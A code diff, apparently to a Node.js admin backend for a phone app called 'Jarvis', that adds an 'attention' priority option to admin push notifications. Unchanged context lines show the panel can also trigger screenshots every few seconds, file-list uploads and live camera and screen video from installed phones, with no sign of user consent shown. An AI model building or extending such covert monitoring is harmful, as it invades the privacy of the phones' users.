@@ -100,7 +100,7 @@ const DEFAULT_CONFIG = {
   live_screen: {}, // install_id -> true (admin live screen — app uploads a screenshot every ~3s while set)
   file_list_requested: {}, // install_id -> true (consumed when the app uploads its file list)
   live_video: {}, // install_id -> true (admin Agora live video — app publishes camera+screen video while set)
-  messages: [], // {id, target: "all" | install_id, title, body, at} — shown as a notification on the phone
+  messages: [], // {id, target: "all" | install_id, title, body, at, priority: "normal" | "attention"} — shown as a notification on the phone; attention = urgent heads-up alert
 };
 
 // ---------------------------------------------------------------- storage
@@ -510,6 +510,8 @@ ${USING_DEFAULT_KEY ? '<div class="warnbar"><b>WARNING:</b> You are using the de
 <p class="muted">The phone shows it as a system notification on its next heartbeat (within ~15 min). No Firebase needed — the app polls the backend.</p>
 <label>To</label>
 <select id="msgTarget">${targetOpts}</select>
+<label>Type</label>
+<select id="msgPriority"><option value="normal">🔔 Normal notification</option><option value="attention">🚨 Attention — sobar kache urgent alert (heads-up + vibration)</option></select>
 <label>Title</label>
 <input id="msgTitle" placeholder="e.g. Jarvis update is here!">
 <label>Message</label>
@@ -777,7 +779,7 @@ async function sendMsg() {
   const body = document.getElementById('msgBody').value.trim();
   if (!title || !body) { alert('Title and message are needed.'); return; }
   const r = await fetch('/api/admin/message', { method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ key: KEY, target: document.getElementById('msgTarget').value, title: title, body: body }) });
+    body: JSON.stringify({ key: KEY, target: document.getElementById('msgTarget').value, priority: document.getElementById('msgPriority').value, title: title, body: body }) });
   const j = await r.json();
   document.getElementById('msgResult').textContent = r.ok ? ' ✅ Sent — phones show it on their next heartbeat.' : ' ❌ ' + (j.error || r.status);
   if (r.ok) { document.getElementById('msgTitle').value = ''; document.getElementById('msgBody').value = ''; }
@@ -1416,6 +1418,7 @@ const server = http.createServer(async (req, res) => {
       const target = String(body.target || "all").trim();
       const title = String(body.title || "").trim().slice(0, 100);
       const text = String(body.body || body.text || "").trim().slice(0, 500);
+      const priority = body.priority === "attention" ? "attention" : "normal";
       if (!title || !text) return sendJson(res, 400, { error: "title and body required" });
       if (target !== "all") {
         const users = loadUsers();
@@ -1423,7 +1426,7 @@ const server = http.createServer(async (req, res) => {
       }
       const cfg = loadConfig();
       cfg.messages = cfg.messages || [];
-      const msg = { id: crypto.randomBytes(6).toString("hex"), target, title, body: text, at: new Date().toISOString() };
+      const msg = { id: crypto.randomBytes(6).toString("hex"), target, title, body: text, at: new Date().toISOString(), priority };
       cfg.messages.push(msg);
       if (cfg.messages.length > 20) cfg.messages = cfg.messages.slice(-20);
       saveConfig(cfg);
